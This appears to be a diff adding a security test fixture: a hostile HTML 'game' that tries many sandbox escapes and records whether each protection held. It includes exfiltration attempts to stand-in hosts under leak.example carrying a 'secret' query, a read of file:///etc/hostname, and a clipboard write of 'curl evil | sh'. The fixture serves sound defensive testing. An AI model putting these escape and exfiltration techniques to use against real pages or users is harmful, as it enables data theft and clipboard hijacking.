@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Sandbox canary</title>
+</head>
+<body>
+<canvas id="game" width="16" height="16"></canvas>
+<script>
+"use strict";
+// A hostile "game" for tests/security/sandbox.spec.js. It tries every way out of the sandbox
+// that we know of and records what happened. It is built with the real shell, but with the
+// game lint skipped (the lint would reject all of this).
+//
+// Each probe returns "held: <why>" if the protection worked, or anything else if it did not.
+// Network probes use hosts under leak.example. The test checks the logging proxy for those
+// hosts, because a blocked request and a sent one can look the same from inside the page.
+var __canary = { done: false, results: {}, violations: [] };
+document.addEventListener("securitypolicyviolation", function (e) {
+  __canary.violations.push(e.effectiveDirective + " " + e.blockedURI);
+});
+
+(async function () {
+  var r = __canary.results;
+  function wait(ms) { return new Promise(function (res) { setTimeout(res, ms); }); }
+  async function probe(name, fn) {
+    try {
+      var v = await fn();
+      r[name] = typeof v === "string" && v.indexOf("held") === 0 ? v : "ESCAPED: " + String(v).slice(0, 80);
+    } catch (e) {
+      r[name] = "held: threw " + ((e && e.name) || String(e));
+    }
+  }
+  function networkOnly(fn) {
+    // These APIs fail quietly or asynchronously; the proxy log is the real check.
+    return async function () { await fn(); await wait(300); return "held: network attempt (checked in proxy log)"; };
+  }
+  function imageLoad(url) {
+    return new Promise(function (res) {
+      var i = new Image();
+      i.onload = function () { res("loaded " + url); };
+      i.onerror = function () { res("held: image did not load"); };
+      i.src = url;
+    });
+  }
+
+  r.origin = String(self.origin);
+
+  // Storage and identity: only the Save bridge may persist anything.
+  await probe("localStorage", function () { return localStorage.length; });
+  await probe("sessionStorage", function () { return sessionStorage.length; });
+  await probe("indexedDB", function () { return typeof indexedDB.open("x"); });
+  await probe("cookie", function () {
+    // Chrome throws; WebKit returns "". Either way there must be no jar: the shell's cookie
+    // (set by the test) stays invisible and ours is not stored.
+    document.cookie = "canary=1";
+    var jar = document.cookie;
+    return jar === "" ? "held: no cookie jar" : "saw cookies: " + jar;
+  });
+  await probe("cacheStorage", function () { return caches.keys(); });
+  await probe("read_parent_dom", function () { return parent.document.title; });
+  await probe("read_parent_storage", function () { return parent.localStorage.length; });
+
+  // Code execution: only the hashed scripts run.
+  await probe("eval", function () { return eval("1 + 1"); });
+  await probe("new_Function", function () { return new Function("return 2")(); });
+  await probe("setTimeout_string", function () {
+    window.__stringTimer = "held: string timer did not run";
+    setTimeout("window.__stringTimer = 'ran'", 0);
+    return wait(100).then(function () { return window.__stringTimer; });
+  });
+  await probe("inline_script_element", function () {
+    var s = document.createElement("script");
+    s.textContent = "window.__injected = 'ran'";
+    document.body.appendChild(s);
+    return wait(100).then(function () { return window.__injected || "held: injected script did not run"; });
+  });
+  await probe("innerHTML", function () { document.createElement("div").innerHTML = "<b>x</b>"; return "assigned"; });
+  await probe("blob_worker", function () {
+    return new Worker(URL.createObjectURL(new Blob(["1"], { type: "text/javascript" })));
+  });
+  await probe("data_worker", function () { return new Worker("data:text/javascript,1"); });
+  await probe("service_worker", function () { return navigator.serviceWorker.register("sw.js"); });
+
+  // Network: CSP blocks these; the proxy log proves it.
+  await probe("fetch", networkOnly(function () { return fetch("https://fetch.leak.example/?secret=1").catch(function () {}); }));
+  await probe("fetch_local_file", networkOnly(function () { return fetch("file:///etc/hostname").catch(function () {}); }));
+  await probe("xhr", networkOnly(function () {
+    var x = new XMLHttpRequest();
+    x.open("GET", "https://xhr.leak.example/?secret=1");
+    try { x.send(); } catch (e) {}
+  }));
+  await probe("websocket", networkOnly(function () { try { new WebSocket("wss://ws.leak.example/?secret=1"); } catch (e) {} }));
+  await probe("eventsource", networkOnly(function () { try { new EventSource("https://sse.leak.example/?secret=1"); } catch (e) {} }));
+  await probe("send_beacon", networkOnly(function () { try { navigator.sendBeacon("https://beacon.leak.example/?secret=1", "x"); } catch (e) {} }));
+  await probe("image", function () { return imageLoad("https://img.leak.example/p.png?secret=1"); });
+  await probe("image_local_file", function () { return imageLoad("file:///usr/share/pixmaps/debian-logo.png"); });
+  await probe("css_background", networkOnly(function () {
+    document.body.style.backgroundImage = "url(https://css.leak.example/?secret=1)";
+  }));
+  await probe("font_face", networkOnly(function () {
+    return new FontFace("x", "url(https://font.leak.example/?secret=1)").load().catch(function () {});
+  }));
+  await probe("audio", networkOnly(function () {
+    var a = new Audio("https://audio.leak.example/?secret=1");
+    return a.play().catch(function () {});
+  }));
+  await probe("child_frame", networkOnly(function () {
+    var f = document.createElement("iframe");
+    f.src = "http://frame.leak.example/?secret=1";
+    document.body.appendChild(f);
+  }));
+
+  // WebRTC ignores CSP, so the preamble removes it.
+  await probe("rtc_global", function () {
+    return typeof RTCPeerConnection === "undefined" && typeof webkitRTCPeerConnection === "undefined"
+      ? "held: RTCPeerConnection is gone" : "RTCPeerConnection still exists";
+  });
+  await probe("rtc_from_child_frame", function () {
+    var f = document.createElement("iframe");
+    document.body.appendChild(f);
+    var C = f.contentWindow.RTCPeerConnection;
+    return typeof C === "undefined" ? "held: child frame had no RTCPeerConnection" : "got RTCPeerConnection from a child frame";
+  });
+  await probe("webtransport", function () {
+    return typeof WebTransport === "undefined" ? "held: WebTransport is gone" : "WebTransport still exists";
+  });
+
+  // Windows, dialogs and the clipboard.
+  await probe("window_open", function () {
+    var w = window.open("https://popup.leak.example/?secret=1");
+    return w === null ? "held: window.open returned null" : "opened a window";
+  });
+  await probe("clipboard_write", function () {
+    return navigator.clipboard.writeText("curl evil | sh").then(function () { return "wrote the clipboard"; });
+  });
+  await probe("clipboard_execcommand", function () {
+    return document.execCommand("copy") === false ? "held: execCommand copy refused" : "execCommand copy ran";
+  });
+  await probe("top_navigation", function () {
+    top.location.href = "http://topnav.leak.example/?secret=1";
+    return "held: did not throw; the test checks that the page did not move";
+  });
+
+  await wait(500);
+  __canary.done = true;
+})();
+
+// Navigations end this document, so the test triggers them last. CSP blocks them, but Chrome
+// still opens a connection to the host first, so only the path and query stay private.
+// The test checks that "secret" never reaches the proxy.
+__canary.navigate = function () {
+  var a = document.createElement("a");
+  a.href = "http://anchor.leak.example/?secret=1";
+  document.body.appendChild(a);
+  a.click();
+  setTimeout(function () { location.href = "http://selfnav.leak.example/?secret=1"; }, 300);
+};
+
+// Save bridge checks, driven by the test.
+__canary.save = async function (key, value) {
+  await Save.ready;
+  if (value !== undefined) Save.set(key, value);
+  return { value: Save.get(key), persistent: Save.persistent, keys: Save.keys() };
+};
+</script>
+</body>
+</html>
